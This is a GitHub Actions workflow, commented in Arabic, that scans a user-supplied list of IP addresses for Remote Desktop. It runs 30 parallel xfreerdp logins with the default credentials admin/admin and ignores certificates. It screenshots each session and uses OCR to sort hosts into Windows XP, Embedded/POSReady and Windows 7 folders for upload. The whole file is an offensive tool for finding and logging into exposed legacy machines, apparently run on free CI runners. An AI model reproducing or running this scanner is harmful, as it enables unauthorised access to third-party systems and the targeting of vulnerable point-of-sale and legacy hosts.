name: RDP Ultra Scanner (30 Parallel & OCR)
on: 
  workflow_dispatch:
    inputs:
      scan_limit:
        description: 'إجمالي الأجهزة للفحص'
        required: true
        default: '100'

jobs:
  capture-screens:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Install Advanced Dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y freerdp2-x11 xvfb fluxbox scrot tesseract-ocr parallel

      - name: Run Ultra Parallel Scan
        run: |
          # إنشاء المجلدات لتنظيم النتائج
          mkdir -p Results/Windows_XP Results/Windows_Embedded Results/Windows_7 Results/Unknown

          DEFAULT_PORT=$(grep "port=" nonla.txt | cut -d'=' -f2 || echo "3389")
          LIMIT=${{ github.event.inputs.scan_limit }}
          grep -v "port=" nonla.txt | head -n "$LIMIT" > targets.tmp

          # دالة الفحص المعزولة والمحسنة سريرياً
          scan_and_sort_isolated() {
            IP_PORT=$1
            # رقم شاشة فريد لكل عملية لضمان العزل التام
            DISPLAY_NUM=$((100 + $PARALLEL_SEQ))
            export DISPLAY=:$DISPLAY_NUM
            
            IP=$(echo $IP_PORT | cut -d':' -f1)
            PORT=$(echo $IP_PORT | grep ":" && echo $IP_PORT | cut -d':' -f2 || echo "3389")
            
            echo "[*] Launching Instance $PARALLEL_SEQ for $IP on $DISPLAY"

            # تشغيل شاشة وهمية خفيفة جداً (16-bit) لتوفير الذاكرة
            Xvfb $DISPLAY -screen 0 1024x768x16 &
            X_PID=$!
            sleep 1
            
            # تشغيل مدير النوافذ
            fluxbox &
            FLUX_PID=$!
            
            # تشغيل الاتصال مع تعديل الوقت لـ 30 ثانية انتظار (عبر الـ timeout)
            # تم إضافة خيارات لتقليل استهلاك المعالج أثناء الفتح
            timeout 40s xfreerdp /v:$IP:$PORT /cert:ignore /sec:any /size:1024x768 /u:admin /p:admin /network:auto /gfx:off -themes -wallpaper /audio-mode:2 /compression-level:2 &
            RDP_PID=$!
            
            # وقت الانتظار الذي طلبته (30 ثانية)
            sleep 30
            
            IMG_PATH="${IP}.png"
            scrot "$IMG_PATH"
            
            # إنهاء العمليات فوراً لتوفير الموارد للعمليات التالية
            kill $RDP_PID $FLUX_PID $X_PID 2>/dev/null || true
            
            # تحليل الـ OCR لتصنيف الصور
            if [ -f "$IMG_PATH" ]; then
              OCR_TEXT=$(tesseract "$IMG_PATH" stdout -l eng 2>/dev/null | tr '[:upper:]' '[:lower:]')
              
              if [[ "$OCR_TEXT" == *"windows xp"* ]]; then
                mv "$IMG_PATH" Results/Windows_XP/
              elif [[ "$OCR_TEXT" == *"embedded"* || "$OCR_TEXT" == *"posready"* || "$OCR_TEXT" == *"2009"* ]]; then
                mv "$IMG_PATH" Results/Windows_Embedded/
              elif [[ "$OCR_TEXT" == *"windows 7"* ]]; then
                mv "$IMG_PATH" Results/Windows_7/
              elif [[ -s "$IMG_PATH" ]]; then
                mv "$IMG_PATH" Results/Unknown/
              else
                rm "$IMG_PATH"
              fi
            fi
          }

          export -f scan_and_sort_isolated
          # تشغيل 30 عملية متوازية في نفس الوقت (-j 30)
          cat targets.tmp | parallel -j 30 --env DISPLAY --env PARALLEL_SEQ scan_and_sort_isolated
          
      - name: Upload Results
        uses: actions/upload-artifact@v4
        with:
          name: Ultra-Organized-Screens
          path: Results/
